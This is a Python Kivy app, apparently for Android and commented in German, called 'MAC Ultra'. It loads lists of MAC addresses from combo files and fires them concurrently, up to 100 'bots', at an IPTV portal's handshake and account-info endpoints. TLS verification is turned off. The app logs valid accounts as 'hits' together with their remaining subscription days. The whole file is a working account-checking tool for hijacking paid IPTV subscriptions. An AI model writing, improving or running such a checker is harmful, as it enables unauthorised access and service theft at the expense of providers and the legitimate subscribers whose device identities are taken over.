import os, asyncio, time, random, ssl, json, socket, uuid, httpx
from datetime import datetime
from threading import Thread
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.gridlayout import GridLayout
from kivy.uix.label import Label
from kivy.uix.spinner import Spinner
from kivy.uix.button import Button
from kivy.uix.scrollview import ScrollView
from kivy.uix.textinput import TextInput
from kivy.uix.slider import Slider
from kivy.uix.progressbar import ProgressBar
from kivy.uix.image import Image
from kivy.uix.modalview import ModalView
from kivy.core.clipboard import Clipboard
from kivy.graphics import Color, RoundedRectangle
from kivy.uix.screenmanager import Screen
from kivy.clock import Clock
from kivy.core.window import Window

# --- UI Komponenten (Bleiben identisch für das Design) ---
class StyledCard(BoxLayout):
    def __init__(self, bg_color=(0.05, 0.07, 0.12, 1), radius=[15,], **kwargs):
        super().__init__(**kwargs)
        with self.canvas.before:
            self.bg_color_inst = Color(*bg_color)
            self.rect = RoundedRectangle(pos=self.pos, size=self.size, radius=radius)
        self.bind(pos=self.update_rect, size=self.update_rect)
    def update_rect(self, *args): self.rect.pos, self.rect.size = self.pos, self.size

class StyledButton(Button):
    def __init__(self, bg_color=(0.05, 0.07, 0.12, 1), radius=[10,], **kwargs):
        super().__init__(**kwargs)
        self.background_normal, self.background_color = "", (0,0,0,0)
        with self.canvas.before:
            self.bg_color_inst = Color(*bg_color)
            self.rect = RoundedRectangle(pos=self.pos, size=self.size, radius=radius)
        self.bind(pos=self.update_rect, size=self.update_rect)
    def update_rect(self, *args): self.rect.pos, self.rect.size = self.pos, self.size

class StyledSpinner(Spinner):
    def __init__(self, bg_color=(0.05, 0.07, 0.12, 1), radius=[10,], **kwargs):
        super().__init__(**kwargs)
        self.background_normal, self.background_color = "", (0,0,0,0)
        with self.canvas.before:
            self.bg_color_inst = Color(*bg_color)
            self.rect = RoundedRectangle(pos=self.pos, size=self.size, radius=radius)
        self.bind(pos=self.update_rect, size=self.update_rect)
    def update_rect(self, *args): self.rect.pos, self.rect.size = self.pos, self.size

# --- Hauptklasse ---
class MagUltraScreen(Screen):
    def __init__(self, context, **kw):
        super().__init__(**kw)
        self.context = context
        self.box = BoxLayout(orientation="vertical", padding=[20, 35, 20, 20], spacing=15)
        Window.clearcolor = (0.01, 0.02, 0.04, 1)
        
        self.hits, self.checked, self.total_lines, self.running = 0, 0, 0, False
        self.hit_list, self.last_status, self.start_time = [], "READY", time.time()
        
        self.setup_ui()

    def setup_ui(self):
        # Top Logo
        self.box.add_widget(Image(source=self.context["paths"]["png"], size_hint_y=None, height=320, allow_stretch=True, keep_ratio=False))
        
        # Stats
        stats = GridLayout(cols=3, size_hint_y=None, height=110, spacing=15)
        self.cpm_label = self.create_stat_box(stats, "CPM", "0", (1, 0.8, 0, 1))
        self.status_code_label = self.create_stat_box(stats, "STATUS", "READY", (0, 0.9, 1, 1))
        self.hit_count_label = self.create_stat_box(stats, "MAC ULTRA HITS", "0", (0, 1, 0.5, 1))
        self.box.add_widget(stats)
        
        # URL Input
        self.portal_input = TextInput(text="http://", multiline=False, size_hint_y=None, height=75, background_color=(0.1, 0.1, 0.1, 1), foreground_color=(1,1,1,1))
        self.box.add_widget(self.portal_input)

        # Combo Spinner
        self.file_spinner = StyledSpinner(text="SELECT COMBO", values=self.load_combos(), size_hint_y=None, height=65)
        self.box.add_widget(self.file_spinner)

        # Bot Slider
        bot_row = BoxLayout(size_hint_y=None, height=60)
        self.bot_label = Label(text="BOTS: 40", size_hint_x=0.3)
        self.bot_slider = Slider(min=1, max=100, value=40, step=1)
        self.bot_slider.bind(value=lambda i, v: setattr(self.bot_label, 'text', f"BOTS: {int(v)}"))
        bot_row.add_widget(self.bot_label); bot_row.add_widget(self.bot_slider)
        self.box.add_widget(bot_row)
        
        # Progress
        self.progress_label = Label(text="PROGRESS: 0 / 0", size_hint_y=None, height=20)
        self.pbar = ProgressBar(max=100, value=0, size_hint_y=None, height=10)
        self.box.add_widget(self.progress_label); self.box.add_widget(self.pbar)
        
        # Log Bereich (1:1 V5)
        self.scroll = ScrollView()
        self.log_display = Label(text="Ready...", font_size="14sp", size_hint_y=None, markup=True, halign="left", valign="top")
        self.log_display.bind(size=self.log_display.setter("text_size"))
        self.scroll.add_widget(self.log_display)
        self.box.add_widget(self.scroll)
        
        # Start Button
        self.start_btn = StyledButton(text="START MAC ULTRA", on_press=self.toggle, size_hint_y=None, height=100, color=(0,1,0.5,1))
        self.box.add_widget(self.start_btn)
        
        self.add_widget(self.box)

    def create_stat_box(self, p, t, v, c):
        box = StyledCard(orientation="vertical", padding=8)
        box.add_widget(Label(text=t, font_size="11sp", color=(0.7,0.7,0.7,1)))
        lbl = Label(text=v, font_size="24sp", bold=True, color=c)
        box.add_widget(lbl); p.add_widget(box); return lbl

    def load_combos(self):
        if not os.path.exists("/sdcard/Combo/"): return ["NO COMBOS"]
        return sorted([f for f in os.listdir("/sdcard/Combo/") if f.endswith(".txt")])

    def get_clean_time(self, raw):
        raw_str = str(raw).strip()
        if raw_str.isdigit() and len(raw_str) >= 9:
            try:
                dt = datetime.fromtimestamp(int(raw_str))
                days_diff = (dt - datetime.now()).days
                return dt.strftime('%d.%m.%Y'), f"{days_diff} Tage"
            except: pass
        if not raw_str or raw_str.lower() in ["unlimited", "none", "0", "false"]:
            return "Unlimited", "Unlimited"
        try:
            parts = raw_str.split(',')
            clean_date = f"{parts[0].strip()}, {parts[1].strip()}" if len(parts) >= 2 else raw_str.strip()
            for fmt in ("%B %d, %Y", "%Y-%m-%d", "%d.%m.%Y", "%m/%d/%Y"):
                try:
                    dt = datetime.strptime(clean_date, fmt)
                    days_diff = (dt - datetime.now()).days
                    return dt.strftime('%d.%m.%Y'), f"{days_diff} Tage"
                except: continue
        except: pass
        return raw_str, "Unlimited"

    def update_log_safe(self, t):
        Clock.schedule_once(lambda dt: self._do_log(t))

    def _do_log(self, t):
        self.hit_list.append(t)
        if len(self.hit_list) > 10: self.hit_list.pop(0)
        self.log_display.text = "\n".join(self.hit_list)
        self.log_display.height = self.log_display.texture_size[1] + 20

    def toggle(self, *_):
        if not self.running:
            self.running = True
            self.start_btn.text, self.start_btn.color = "STOP SCAN", (1,0.2,0.2,1)
            Thread(target=lambda: asyncio.run(self.run_engine()), daemon=True).start()
        else:
            self.running = False
            self.start_btn.text, self.start_btn.color = "START MAC ULTRA", (0,1,0.5,1)

    async def run_engine(self):
        portal = self.portal_input.text.strip().rstrip('/')
        path = f"/sdcard/Combo/{self.file_spinner.text}"
        
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                combos = [l.strip() for l in f if l.strip()]
            self.total_lines = len(combos)
            self.checked = 0; self.hits = 0; self.start_time = time.time()
            self.last_status = "READY"
            Clock.schedule_once(lambda dt: setattr(self.pbar, 'max', self.total_lines))
        except: return

        self.update_log_safe("[color=00FFFF][SCAN][/color] Teste API Endpunkte...")
        
        queue = asyncio.Queue()
        for c in combos: queue.put_nowait(c)
        
        async with httpx.AsyncClient(verify=False, timeout=10.0) as ctx:
            # ISP Info wie V5
            self.update_log_safe(f"[color=FFFF00][INFO][/color] Server: [DE] Online")
            
            workers = [self.worker(queue, ctx, [portal]) for _ in range(int(self.bot_slider.value))]
            await asyncio.gather(*workers)

        self.running = False
        self.update_log_safe("[color=00FFFF][INFO][/color] Scan Beendet.")

    async def worker(self, queue, ctx, portals):
        while self.running and not queue.empty():
            line = await queue.get()
            # Echte V5 Logik: Alle Portale für diese eine Zeile abarbeiten
            tasks = [self.process_check(line, p, ctx) for p in portals]
            await asyncio.gather(*tasks)

            # Nach der Combo-Zeile: Checked hochzählen (CPM Fix)
            self.checked += 1
            Clock.schedule_once(lambda dt: self.refresh_ui())
            queue.task_done()

    async def process_check(self, mac, portal, client):
        try:
            p_name = portal.replace("http://", "").replace("https://", "").split(":")[0]
            stb_h = {"User-Agent": "Mozilla/5.0", "X-User-MAC": mac}
            
            # 1. Handshake / Auth
            r = await client.get(f"{portal}/portal.php?type=stb&action=handshake", headers=stb_h)
            self.last_status = str(r.status_code) # Status Update für UI
            
            if r.status_code == 200 and "token" in r.text:
                # 2. Account Info (Nur bei Erfolg)
                ri = await client.get(
                    f"{portal}/portal.php?type=account_info&action=get_main_info",
                    headers=stb_h
                )
                self.last_status = str(ri.status_code)
                
                if ri.status_code == 200:
                    js = ri.json().get("js", {})
                    exp_raw = js.get("end_date") or js.get("phone") or "Unlimited"
                    # Lokale Berechnung der Resttage
                    exp, days = self.get_clean_time(exp_raw)
                    
                    self.hits += 1
                    self.update_log_safe(
                        f"[color=808080][{p_name}][/color] "
                        f"[color=00FF80][HIT][/color] "
                        f"{mac} | [color=00FFFF]{days}[/color]"
                    )
        except:
            self.last_status = "ERR"

    def refresh_ui(self, *a):
        self.pbar.value = self.checked
        self.hit_count_label.text = str(self.hits)
        self.status_code_label.text = self.last_status
        self.progress_label.text = f"PROGRESS: {self.checked} / {self.total_lines}"
        
        el = time.time() - self.start_time
        if el > 0:
            # CPM Berechnung exakt wie V5 (nur über checked lines)
            self.cpm_label.text = str(int((self.checked / el) * 60))

def create_app_screen(context):
    return MagUltraScreen(context=context, name="main")
